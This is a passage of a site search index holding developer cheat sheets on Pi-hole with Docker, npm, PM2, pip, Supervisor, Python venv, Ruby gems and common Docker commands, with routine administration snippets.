environment:\n      - PORT=53\n      - UPSTREAM1=https://8.8.8.8/dns-query\n      - UPSTREAM2=https://8.8.8.8/dns-query\n    volumes:\n      - /etc/localtime:/etc/localtime\n\nnetworks:\n  dns:\n    ipam:\n      config:\n        - subnet: 172.20.0.0/24\n</code></pre> <p>Now run <code>docker-compose up -d</code> to create the containers. If all went well you should should be able to access the pihole server at <code>http://127.0.0.1.7003</code> with password <code>ChangeMe</code> from the config above.</p> <p>Now you need to change your dns server to point to the pihole server. We are done with the installation.</p>", "tags": ["pi-hole", "doh", "docker", "dns", "dns-over-https"]}, {"location": "development/node-npm/npm/", "title": "Npm Command-line Utility", "text": "<p>npm is two things: first and foremost, it is an online repository for the publishing of open-source Node.js projects; second, it is a command-line utility for interacting with said repository that aids in package installation, version management, and dependency management. A plethora of Node.js libraries and applications are published on npm, and many more are added every day.</p>", "tags": ["npm", "cheat-sheet", "node"]}, {"location": "development/node-npm/npm/#updating-node-npm-to-latest-stable-version", "title": "Updating Node &amp; npm to Latest Stable Version", "text": "<p>npm:</p> <pre><code>npm install -g npm\n</code></pre> <p>node:</p> <pre><code>npm cache clean -f\nnpm install -g n\nn stable\n</code></pre>", "tags": ["npm", "cheat-sheet", "node"]}, {"location": "development/node-npm/npm/#updating-local-project-packages", "title": "Updating Local Project Packages", "text": "<p>Navigate to the root directory of your project and ensure it contains a package.json In your project root directory, run:</p> <pre><code>npm update\n</code></pre> <p>To test the update, run the <code>outdated</code> command. There should not be any output.</p> <pre><code>npm outdated\n</code></pre>", "tags": ["npm", "cheat-sheet", "node"]}, {"location": "development/node-npm/npm/#updating-globally-installed-packages", "title": "Updating Globally-Installed Packages", "text": "<p>To see which global packages need to be updated, on the command line, run:</p> <pre><code>npm outdated -g --depth=0\n</code></pre> <p>To update a single global package, on the command line, run:</p> <pre><code>npm update -g &lt;package_name&gt;\n</code></pre> <p>To update all global packages, on the command line, run:</p> <pre><code>npm update -g\n</code></pre>", "tags": ["npm", "cheat-sheet", "node"]}, {"location": "development/node-npm/pm2/", "title": "PM2 - Node.js Process Manager", "text": "<p>PM2 is a daemon process manager that will help you manage and keep your application online. Getting started with PM2 is straightforward, it is offered as a simple and intuitive CLI, installable via NPM.</p> <p>Follow the official documentation for installation and usage instructions: PM2 Official Documentation</p>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#installation", "title": "Installation", "text": "<p>The latest PM2 version is installable with NPM or Yarn:</p> <pre><code>npm install pm2@latest -g\n# or\nyarn global add pm2\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#start-an-application-with-pm2", "title": "Start An Application With PM2", "text": "<p>The simplest way to start, daemonize and monitor your application is by using this command line:</p> <pre><code>pm2 start app.js\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#start-application-with-detailed-time-for-logs", "title": "Start Application With Detailed Time For Logs", "text": "<pre><code>pm2 start app.js --log-date-format \"YYYY-MM-DD HH:mm:ss\"\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#managing-processes", "title": "Managing Processes", "text": "<p>Managing application state is simple here are the commands:</p> <pre><code>pm2 restart app_name\npm2 reload app_name\npm2 stop app_name\npm2 delete app_name\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#save-configuration-of-processes-to-pm2", "title": "Save Configuration of Processes to PM2", "text": "<p>And to freeze a process list for automatic respawn:</p> <pre><code>pm2 save\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#list-managed-applications", "title": "List Managed Applications", "text": "<p>List the status of all application managed by PM2:</p> <pre><code>pm2 [list|ls|status]\n</code></pre> <p></p>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#display-logs", "title": "Display Logs", "text": "<p>To display logs in realtime for all processes managed by PM2, use the following command:</p> <pre><code>pm2 logs\n</code></pre> <p>To display logs in realtime for all processes managed by PM2, for last 200 lines use the following command:</p> <pre><code>pm2 logs --lines 200\n</code></pre> <p>To display logs in realtime for specific process, use the following command:</p> <pre><code>pm2 logs &lt;app_name&gt;/&lt;id&gt;\n</code></pre> <p>To display logs in realtime for specific process, for last 200 lines use the following command:</p> <pre><code>pm2 logs &lt;app_name&gt;/&lt;id&gt; --lines 200\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#auto-startup-pm2", "title": "Auto Startup PM2", "text": "<p>Restarting PM2 with the processes you manage on server boot/reboot is critical. To solve this, just run this command to generate an active startup script:</p> <pre><code>pm2 startup\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#auto-startup-pm2-on-raspberry-pi", "title": "Auto Startup PM2 on Raspberry Pi", "text": "<p>When using PM2 on Raspberry Pi. You will encounter a problem when you try to start pm2 with the default command.</p> <pre><code>sudo env PATH=$PATH:/usr/local/bin pm2 startup systemd -u pi --hp /home/pi\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/node-npm/pm2/#updating-pm2", "title": "Updating PM2", "text": "<p>It's very useful to update PM2 to the latest version specially when you update your Node.js version. Since updating node usually will brake the pm2 process to function properly, you can use the following command to update PM2:</p> <pre><code>npm install pm2@latest -g\n</code></pre> <p>Then update the in-memory PM2:</p> <pre><code>pm2 update\n</code></pre> <p>You can also create a <code>alias</code> to update PM2 with one command:</p> <pre><code>alias pm2update='npm install pm2@latest -g &amp;&amp; pm2 update &amp;&amp; pm2 save'\n</code></pre>", "tags": ["npm", "node", "pm2", "cheat-sheet", "process-manager"]}, {"location": "development/python/pip/", "title": "Pip Python Package Manager Cheat Sheet", "text": "<p>Pip is the package installer for Python. You can use it to install packages from the Python Package Index and other indexes.</p>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#list-installed-packages-with-pip", "title": "List Installed Packages With Pip", "text": "<pre><code>pip list\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#list-outdated-packages", "title": "List Outdated Packages", "text": "<pre><code>pip list --outdated\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#instal-or-update-package-to-specific-version", "title": "Instal Or Update Package To Specific Version", "text": "<p>exmaple with MySQL_python package:</p> <pre><code>pip install MySQL_python==1.2.2\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#update-package-to-the-latest-avalable-version", "title": "Update Package To The Latest Avalable Version", "text": "<p>exmaple with MySQL_python package:</p> <pre><code>pip install MySQL_python --upgrade\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#update-pip-itself", "title": "Update Pip Itself", "text": "<pre><code>pip install --upgrade pip\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#update-all-packages-installed-with-pip", "title": "Update All Packages Installed With Pip", "text": "<pre><code>pip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1 | xargs -n1 pip install -U\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/pip/#generate-requirementstxt-for-a-project", "title": "Generate requirements.txt For a Project", "text": "<p>Run this command at terminal at the root of the project:</p> <pre><code>pip freeze &gt; requirements.txt\n</code></pre>", "tags": ["python", "pip", "package-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/", "title": "Supervisor Python Processes Management", "text": "<p>Supervisor is a client/server system that allows its users to monitor and control a number of processes on UNIX-like operating systems. Official Supervisord Docs.</p> <p>Example of Supervisord Web UI listening on localhost:9999</p> <p></p>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#tips-of-supervisor-usage", "title": "Tips of Supervisor Usage", "text": "<p>Seeing all child processes running</p> <pre><code>supervisorctl -c /path/to/supervisord.conf\n</code></pre> <p>I find it helpful to create an alias in my bash profile for those 2 commands above so that I don't have to manually type <code>-c</code> all the time</p> <p>Example:</p> <pre><code>echo \"alias supervisord='supervisord -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\"\necho \"alias supervisorctl='supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf'\"\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#list-all-processes", "title": "List All Processes", "text": "<p>You need to provide the path to the supervisor configuration file with - -c /path/to/supervisord.conf</p> <pre><code>supervisorctl -c /System/Volumes/Data/opt/homebrew/etc/supervisord.conf\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#reload-changes-from-config-file-to-supervisor", "title": "Reload Changes from Config File to Supervisor", "text": "<pre><code>supervisorctl reread\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#update-supervisor-configuration", "title": "Update Supervisor Configuration", "text": "<pre><code>supervisorctl update\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#macos-supervisor-installation", "title": "MacOS Supervisor Installation", "text": "<p>Install with pip as system package:</p> <pre><code>brew install supervisor\n</code></pre> <p>The default location of the supervisor configuration file is at <code>/System/Volumes/Data/opt/homebrew/etc/supervisord.conf</code>.</p> <p>You can use a symbolic link to the configuration file to make it persistent. For example, you can move the configuration file to Dropbox folder and use a symbolic link to it.</p> <p>Link the configuration file to the Dropbox folder:</p> <pre><code>rm -rf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf\nln -s /Users/fire1ce/Dropbox/SettingsConfigs/supervisor/supervisord.conf /System/Volumes/Data/opt/homebrew/etc/supervisord.conf\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#start-supervisor-service-on-boot", "title": "Start Supervisor Service on Boot", "text": "<p>In order to start the supervisor service on boot, we need to create a service file for MacOS.</p> <pre><code>sudo nano /Library/LaunchDaemons/com.agendaless.supervisord.plist\n</code></pre> <p>Append the following content to the file:</p> <pre><code>&lt;!-- /Library/LaunchDaemons/com.agendaless.supervisord.plist --&gt;\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;KeepAlive&lt;/key&gt;\n    &lt;dict&gt;\n        &lt;key&gt;SuccessfulExit&lt;/key&gt;\n        &lt;false/&gt;\n    &lt;/dict&gt;\n    &lt;key&gt;Label&lt;/key&gt;\n    &lt;string&gt;com.agendaless.supervisord&lt;/string&gt;\n    &lt;key&gt;ProgramArguments&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;/opt/homebrew/bin/supervisord&lt;/string&gt;\n        &lt;string&gt;-n&lt;/string&gt;\n        &lt;string&gt;-c&lt;/string&gt;\n        &lt;string&gt;/System/Volumes/Data/opt/homebrew/etc/supervisord.conf&lt;/string&gt;\n    &lt;/array&gt;\n    &lt;key&gt;RunAtLoad&lt;/key&gt;\n    &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/supervisor/#supervisor-configuration-file-example-with-2-managed-processes", "title": "Supervisor Configuration File Example With 2 Managed Processes:", "text": "<pre><code>[unix_http_server]\nfile=/opt/homebrew/var/run/supervisor.sock # the path to the socket file\n\n\n[inet_http_server] # inet (TCP) server disabled by default\nport=127.0.0.1:9999 # ip_address:port specifier, *:port for all iface\n# username=user # default is no username (open server)\n# password=123  default is no password (open server)\n\n[supervisord]\nlogfile=/opt/homebrew/var/log/supervisord.log # main log file# default $CWD/supervisord.log\nlogfile_maxbytes=50MB # max main logfile bytes b4 rotation# default 50MB\nlogfile_backups=10 # # of main logfile backups# 0 means none, default 10\nloglevel=info # log level# default info# others: debug,warn,trace\npidfile=/opt/homebrew/var/run/supervisord.pid # supervisord pidfile# default supervisord.pid\nnodaemon=false # start in foreground if true# default false\nsilent=false # no logs to stdout if true# default false\nminfds=1024 # min. avail startup file descriptors# default 1024\nminprocs=200 # min. avail process descriptors#default 200\n\n[rpcinterface:supervisor]\nsupervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface\n\n[supervisorctl]\nserverurl=unix:///opt/homebrew/var/run/supervisor.sock\n\n[include]\nfiles = /opt/homebrew/etc/supervisor.d/*.ini\n\n[program:macos-bt-connect-based-on-ip]\ncommand=/Users/fire1ce/.pyenv/versions/macos-bt-connect-based-on-ip/bin/python /Users/fire1ce/projects/macos-bt-connect-based-on-ip/macos-bt-connect-based-on-ip.py\ndirectory=/Users/fire1ce/projects/macos-bt-connect-based-on-ip\nuser=fire1ce\nautostart=true\nautorestart=true\nstartsecs=2\nstartretries=3\nstdout_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.out.log\nstdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB)\nstdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10)\nstderr_logfile=/opt/homebrew/var/log/macos-bt-connect-based-on-ip.err.log\nstderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB)\nstderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10)\n\n\n[program:macos-screenlock-api]\ncommand=/Users/fire1ce/.pyenv/versions/macos-screenlock-api/bin/python /Users/fire1ce/projects/macos-screenlock-api/macos-screenlock-api.py\ndirectory=/Users/fire1ce/projects/macos-screenlock-api\nuser=fire1ce\nautostart=true\nautorestart=true\nstartsecs=2\nstartretries=3\nstdout_logfile=/opt/homebrew/var/log/macos-screenlock-api.out.log\nstdout_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB)\nstdout_logfile_backups=5 # # of stdout logfile backups (0 means none, default 10)\nstderr_logfile=/opt/homebrew/var/log/macos-screenlock-api.err.log\nstderr_logfile_maxbytes=1MB # max # logfile bytes b4 rotation (default 50MB)\nstderr_logfile_backups=5 # # of stderr logfile backups (0 means none, default 10)\n</code></pre>", "tags": ["python", "supervisor", "processes-manager", "cheat-sheet"]}, {"location": "development/python/virtualenv/", "title": "Python Virtual Environment", "text": "", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/python/virtualenv/#about-python-virtual-environment-venv", "title": "About Python Virtual Environment - venv", "text": "<p>venv is a tool to create isolated Python environments. Since Python 3.3, a subset of it has been integrated into the standard library under the venv module. The venv module provides support for creating lightweight \u201cvirtual environments\u201d with their own site directories, optionally isolated from system site directories. Each virtual environment has its own Python binary (which matches the version of the binary that was used to create this environment) and can have its own independent set of installed Python packages in its site directories.</p>", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/python/virtualenv/#install-venv", "title": "Install venv", "text": "<p>In order to install <code>venv</code>, we need to install the following packages:</p> apt example<pre><code>sudo apt install python3-venv\n</code></pre>", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/python/virtualenv/#initialization-of-a-virtual-environment", "title": "Initialization of a Virtual Environment", "text": "<p>Go to the root destination of your project and run the following command:</p> <pre><code>python3 -m venv .venv\n</code></pre> <p>This will create a virtual environment in the current directory. The virtual environment folder will be named <code>.venv</code>.</p>", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/python/virtualenv/#activation-of-a-virtual-environment", "title": "Activation of a Virtual Environment", "text": "<p>In order to activate a virtual environment, from the root directory of your project, run the following command:</p> <pre><code>source .venv/bin/activate\n</code></pre> <p>Check if the virtual environment is activated by running the following command:</p> <pre><code>which python\n</code></pre> <p>The output should be with <code>../.venv/bin/python</code> as the output.</p> <p>Bonus:</p> <p>You can add an alias to your bash profile to make it easier to activate the virtual environment:</p> <pre><code>alias activate='source .venv/bin/activate'\n</code></pre>", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/python/virtualenv/#deactivation-of-a-virtual-environment", "title": "Deactivation of a Virtual Environment", "text": "<p>When you are done with the virtual environment, you can deactivate it by running the following command:</p> <p><pre><code>deactivate\n</code></pre> Or alternatively you can exit the current shell.</p>", "tags": ["python", "venv", "cheat-sheet"]}, {"location": "development/ruby/ruby/", "title": "Ruby Gem Package Manager", "text": "<p>RubyGems is a package manager for the Ruby programming language that provides a standard format for distributing Ruby programs and libraries (in a self-contained format called a \"gem\"), a tool designed to easily manage the installation of gems, and a server for distributing them.</p>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#finding-installed-and-available-gems", "title": "Finding Installed And Available Gems", "text": "<pre><code>gem list\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#installing-new-gems", "title": "Installing New Gems", "text": "<pre><code>gem install rails_utils\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#removing-deleting-gems", "title": "Removing / Deleting Gems", "text": "<pre><code>gem uninstall rails_utils\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#finding-outdated-gems", "title": "Finding Outdated Gems", "text": "<pre><code>gem outdated\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#get-gem-ruby-environment-information", "title": "Get Gem &amp; Ruby Environment Information", "text": "<pre><code>gem environment\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#update-all-the-gems", "title": "Update All the Gems", "text": "<p>Install rubygems-update</p> <pre><code>gem install rubygems-update\n</code></pre> <p>Then run:</p> <pre><code>gem update --system\nupdate_rubygems\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "development/ruby/ruby/#reading-the-gem-documentation", "title": "Reading The Gem Documentation", "text": "<p>One of the most handy and important things about gems is that they [should] come with good documentation to allow you to start working with them fast. The simplest way to go with documentation is to run a local server where you will have access to all installed gems\u2019 usage instructions.</p> <p>Run the following to run a documentation server:</p> <pre><code>gem server\n</code></pre> <p>it will start a server on port 8808.</p> <pre><code># Server started at http://0.0.0.0:8808\n</code></pre>", "tags": ["ruby", "gem", "package-manager", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/", "title": "Common Docker Commands", "text": "<p>This is a short summary of the most commonly used Docker commands. If you're new to Docker, or even experienced Docker, it can be helpful to have a quick reference to the most commonly used Docker commands for managing the Docker environment.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#show-all-local-docker-images", "title": "Show all local Docker Images", "text": "<pre><code>docker images -a\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#removing-docker-images", "title": "Removing Docker Images", "text": "<pre><code>docker rmi &lt;image_id&gt;\n</code></pre> <p>force remove</p> <pre><code>docker rmi -f &lt;image_id&gt;\n</code></pre> <p>force remove all images</p> <pre><code>docker rmi -f $(docker images -aq)\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#show-all-containers-including-running-and-stopped", "title": "Show all Containers Including Running and Stopped", "text": "<pre><code>docker ps -a\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#show-docker-container-logs", "title": "Show Docker Container Logs", "text": "<pre><code>docker logs &lt;container_id&gt;\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#get-a-container-shell", "title": "Get A Container Shell", "text": "<pre><code>docker exec -it &lt;container_id&gt; /bin/bash\n</code></pre> <p>or</p> <pre><code>docker exec -it &lt;container_id&gt; /bin/sh\n</code></pre> <p>depending on the shells available on the Docker image.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#stoping-containers", "title": "Stoping Containers", "text": "<pre><code>docker stop &lt;container_id&gt;\n</code></pre> <p>foce stop with <code>kill</code></p> <pre><code>docker kill &lt;container_id&gt;\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#removing-containers", "title": "Removing Containers", "text": "<pre><code>docker rm &lt;container_id&gt;\n</code></pre> <p>force remove</p> <pre><code>docker rm -f &lt;container_id&gt;\n</code></pre> <p>force remove all containers</p> <pre><code>docker rm -f $(docker ps -aq)\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#find-container-ip-address", "title": "Find Container IP Address", "text": "<pre><code>docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' &lt;container name/id&gt;\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#copy-files-into-docker-container", "title": "Copy Files into Docker Container", "text": "<pre><code>docker cp &lt;local file&gt; &lt;container name/id&gt;:&lt;remote file&gt;\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#copy-files-from-docker-container", "title": "Copy Files from Docker Container", "text": "<pre><code>docker cp &lt;container name/id&gt;:&lt;remote file&gt; &lt;local file&gt;\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#purging", "title": "Purging", "text": "<p>Purging All Unused or Dangling Images, Containers, Volumes, and Networks Docker provides a single command that will clean up any resources \u2014 images, containers, volumes, and networks \u2014 that are dangling (not associated with a container):</p> <pre><code>docker system prune\n</code></pre> <p>To additionally remove any stopped containers and all unused images (not just dangling images), add the -a flag to the command:</p> <pre><code>docker system prune -a\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#monitor-system-resource-utilization-for-running-containers", "title": "Monitor System Resource Utilization for Running Containers", "text": "<p>To check the CPU, memory, and network I/O usage of a single container, you can use:</p> <pre><code>docker stats &lt;container&gt;\n</code></pre> <p>For all containers listed by ID:</p> <pre><code>docker stats $(docker ps -q)\n</code></pre> <p>For all containers listed by name:</p> <pre><code>docker stats $(docker ps --format '{{.Names}}')\n</code></pre> <p>For all containers listed by image:</p> <pre><code>docker ps -a -f ancestor=ubuntu\n</code></pre> <p>Remove all untagged images:</p> <pre><code>docker rmi $(docker images | grep \u201c^\u201d | awk '{split($0,a,\" \"); print a[3]}')\n</code></pre> <p>Remove container by a regular expression:</p> <pre><code>docker ps -a | grep wildfly | awk '{print $1}' | xargs docker rm -f\n</code></pre> <p>Remove all exited containers:</p> <pre><code>docker rm -f $(docker ps -a | grep Exit | awk '{ print $1 }')\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/common-docker-commands/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/", "title": "Docker Containers Cheat Sheet", "text": "", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#whats-a-docker-container", "title": "What's a Docker Container?", "text": "<p>A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#containers", "title": "Containers", "text": "<p>Your basic isolated Docker process. Containers are to Virtual Machines as threads are to processes. Or you can think of them as chroots on steroids.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#lifecycle", "title": "Lifecycle", "text": "<ul> <li><code>docker create</code> creates a container but does not start it.</li> <li><code>docker rename</code> allows the container to be renamed.</li> <li><code>docker run</code> creates and starts a container in one operation.</li> <li><code>docker rm</code> deletes a container.</li> <li><code>docker update</code> updates a container's resource limits.</li> </ul> <p>Normally if you run a container without options it will start and stop immediately, if you want keep it running you can use the command, <code>docker run -td container_id</code> this will use the option <code>-t</code> that will allocate a pseudo-TTY session and <code>-d</code> that will detach automatically the container (run container in background and print container ID).</p> <p>If you want a transient container, <code>docker run --rm</code> will remove the container after it stops.</p> <p>If you want to map a directory on the host to a docker container, <code>docker run -v $HOSTDIR:$DOCKERDIR</code>. Also see Volumes.</p> <p>If you want to remove also the volumes associated with the container, the deletion of the container must include the <code>-v</code> switch like in <code>docker rm -v</code>.</p> <p>There's also a logging driver available for individual containers in docker 1.10. To run docker with a custom log driver (i.e., to syslog), use <code>docker run --log-driver=syslog</code>.</p> <p>Another useful option is <code>docker run --name yourname docker_image</code> because when you specify the <code>--name</code> inside the run command this will allow you to start and stop a container by calling it with the name the you specified when you created it.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#starting-and-stopping", "title": "Starting and Stopping", "text": "<ul> <li><code>docker start</code> starts a container so it is running.</li> <li><code>docker stop</code> stops a running container.</li> <li><code>docker restart</code> stops and starts a container.</li> <li><code>docker pause</code> pauses a running container, \"freezing\" it in place.</li> <li><code>docker unpause</code> will unpause a running container.</li> <li><code>docker wait</code> blocks until running container stops.</li> <li><code>docker kill</code> sends a SIGKILL to a running container.</li> <li><code>docker attach</code> will connect to a running container.</li> </ul> <p>If you want to detach from a running container, use <code>Ctrl + p, Ctrl + q</code>. If you want to integrate a container with a host process manager, start the daemon with <code>-r=false</code> then use <code>docker start -a</code>.</p> <p>If you want to expose container ports through the host, see the exposing ports section.</p> <p>Restart policies on crashed docker instances are covered here.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#cpu-constraints", "title": "CPU Constraints", "text": "<p>You can limit CPU, either using a percentage of all CPUs, or by using specific cores.  </p> <p>For example, you can tell the <code>cpu-shares</code> setting.  The setting is a bit strange -- 1024 means 100% of the CPU, so if you want the container to take 50% of all CPU cores, you should specify 512.  See https://goldmann.pl/blog/2014/09/11/resource-management-in-docker/#_cpu for more:</p> <pre><code>docker run -it -c 512 agileek/cpuset-test\n</code></pre> <p>You can also only use some CPU cores using <code>cpuset-cpus</code>.  See https://agileek.github.io/docker/2014/08/06/docker-cpuset/ for details and some nice videos:</p> <pre><code>docker run -it --cpuset-cpus=0,4,6 agileek/cpuset-test\n</code></pre> <p>Note that Docker can still see all of the CPUs inside the container -- it just isn't using all of them.  See https://github.com/docker/docker/issues/20770 for more details.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#memory-constraints", "title": "Memory Constraints", "text": "<p>You can also set memory constraints on Docker:</p> <pre><code>docker run -it -m 300M ubuntu:14.04 /bin/bash\n</code></pre>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#capabilities", "title": "Capabilities", "text": "<p>Linux capabilities can be set by using <code>cap-add</code> and <code>cap-drop</code>.  See https://docs.docker.com/engine/reference/run/#/runtime-privilege-and-linux-capabilities for details.  This should be used for greater security.</p> <p>To mount a FUSE based filesystem, you need to combine both --cap-add and --device:</p> <pre><code>docker run --rm -it --cap-add SYS_ADMIN --device /dev/fuse sshfs\n</code></pre> <p>Give access to a single device:</p> <pre><code>docker run -it --device=/dev/ttyUSB0 debian bash\n</code></pre> <p>Give access to all devices:</p> <pre><code>docker run -it --privileged -v /dev/bus/usb:/dev/bus/usb debian bash\n</code></pre> <p>More info about privileged containers here.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#info", "title": "Info", "text": "<ul> <li><code>docker ps</code> shows running containers.</li> <li><code>docker logs</code> gets logs from container.  (You can use a custom log driver, but logs is only available for <code>json-file</code> and <code>journald</code> in 1.10).</li> <li><code>docker inspect</code> looks at all the info on a container (including IP address).</li> <li><code>docker events</code> gets events from container.</li> <li><code>docker port</code> shows public facing port of container.</li> <li><code>docker top</code> shows running processes in container.</li> <li><code>docker stats</code> shows containers' resource usage statistics.</li> <li><code>docker diff</code> shows changed files in the container's FS.</li> </ul> <p><code>docker ps -a</code> shows running and stopped containers.</p> <p><code>docker stats --all</code> shows a list of all containers, default shows just running.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#import-export", "title": "Import / Export", "text": "<ul> <li><code>docker cp</code> copies files or folders between a container and the local filesystem.</li> <li><code>docker export</code> turns container filesystem into tarball archive stream to STDOUT.</li> </ul>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#executing-commands", "title": "Executing Commands", "text": "<ul> <li><code>docker exec</code> to execute a command in container.</li> </ul> <p>To enter a running container, attach a new shell process to a running container called foo, use: <code>docker exec -it foo /bin/bash</code>.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-containers/#credit", "title": "Credit", "text": "<p>Thanks to @wsargent for creating this cheat sheet.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/", "title": "Docker Images Cheat Sheet", "text": "", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#whats-a-docker-image", "title": "What's a Docker Image?", "text": "<p>A Docker image is a file used to execute code in a Docker container. Docker images act as a set of instructions to build a Docker container, like a template. Docker images also act as the starting point when using Docker. An image is comparable to a snapshot in virtual machine (VM) environments.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": "devops/docker/docker-images/#images", "title": "Images", "text": "<p>Images are just templates for docker containers.</p>", "tags": ["docker", "cheat-sheet"]}, {"location": 